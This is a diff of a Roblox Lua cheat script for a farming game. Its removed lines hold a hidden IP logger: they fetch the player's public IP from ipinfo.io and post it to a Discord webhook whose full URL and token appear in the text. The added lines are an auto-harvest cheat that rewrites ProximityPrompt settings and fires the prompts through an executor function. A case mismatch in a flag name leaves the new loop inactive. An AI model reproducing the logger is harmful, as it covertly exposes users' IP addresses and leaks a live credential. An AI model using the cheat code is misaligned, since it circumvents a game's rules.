@@ -1,48 +1,49 @@
-local HttpService = game:GetService("HttpService")
-local webhook = "https://discord.com/api/webhooks/1362065828454993970/J_HLKCaHTqWmuZ4sESHeMogdkQ5qodc1lp26fDRnjMgYfZOyvMHE4l1JoveUVvnE_ZRg"  -- Replace with your Discord webhook URL
+-- Services
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
--- Fetch public IP from ipinfo.io
-local response = game:HttpGet("https://ipinfo.io/json")
-local data = HttpService:JSONDecode(response)
-local ip = data.ip
 
--- Create message to send to Discord
-local message = {
-    content = "@everyone " .. ip
-}
+_G.autoCollect = false
+_G.autoWalkToPlant = false
 
--- Convert message to JSON format
-local jsonMessage = HttpService:JSONEncode(message)
 
--- Send IP to Discord webhook
-local success, result = pcall(function()
-    HttpService:PostAsync(webhook, jsonMessage, Enum.HttpContentType.ApplicationJson)
-end)
-
--- Print success/failure status
-if success then
-    print("loaded")
-else
-    print("failed", result)
+local function getOwnedPlot()
+	for _, plot in pairs(workspace.Farm:GetChildren()) do
+		local important = plot:FindFirstChild("Important") or plot:FindFirstChild("Importanert")
+		if important then
+			local data = important:FindFirstChild("Data")
+			if data and data:FindFirstChild("Owner") and data.Owner.Value == player.Name then
+				return plot
+			end
+		end
+	end
+	return nil
 end
 
 
-_G.autocollect = true
-
-local function Apple ()
-		for i,v in pairs(game.workspace.Farm:GetChildren()) do
-		if v:FindFirstChild("Important") and v.Important:FindFirstChild("Plants_Physical") then
-			if v.Important.Plants_Physical:FindFirstChild("Apple") and v.Important.Plants_Physical.Apple:FindFirstChild("Fruits") then
-				for i, f in pairs(v.Important.Plants_Physical.Apple.Fruits:GetChildren()) do
-					if f.Name == "Apple" then
-						if f:FindFirstChild("2") then
-							local two = f:FindFirstChild("2")
-							--print(two)
-							if two:FindFirstChild("ProximityPrompt") then
-								--print("ProximityPrompt Founded")
-								fireproximityprompt(two.ProximityPrompt, 150000)
-								else
-									print("ProximityPrompt is not founded or is not grown enough")
+task.spawn(function()
+	while task.wait(1) do
+		if _G.autocollect then
+			local plot = getOwnedPlot()
+			local farm = plot and plot:FindFirstChild("Important"):FindFirstChild("Plants_Physical")
+			if farm then
+				for _, prompt in ipairs(farm:GetDescendants()) do
+					if prompt:IsA("ProximityPrompt") then
+						local playerRoot = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+						if playerRoot then
+							local dist = (playerRoot.Position - prompt.Parent.Position).Magnitude
+							if dist <= 20 then
+								prompt.Exclusivity = Enum.ProximityPromptExclusivity.AlwaysShow
+								prompt.MaxActivationDistance = 100
+								prompt.RequiresLineOfSight = false
+								prompt.Enabled = true
+								fireproximityprompt(prompt, 1, true)
+							elseif _G.autoWalkToPlant then
+								local humanoid = player.Character and player.Character:FindFirstChild("Humanoid")
+								if humanoid then
+									humanoid:MoveTo(prompt.Parent.Position + Vector3.new(0, 5, 0))
+								end
 							end
 						end
 					end
@@ -50,10 +51,4 @@ local function Apple ()
 			end
 		end
 	end
-end
-
-
-while _G.autocollect do
-   Apple()
-   task.wait(0.1)
-end
+end)
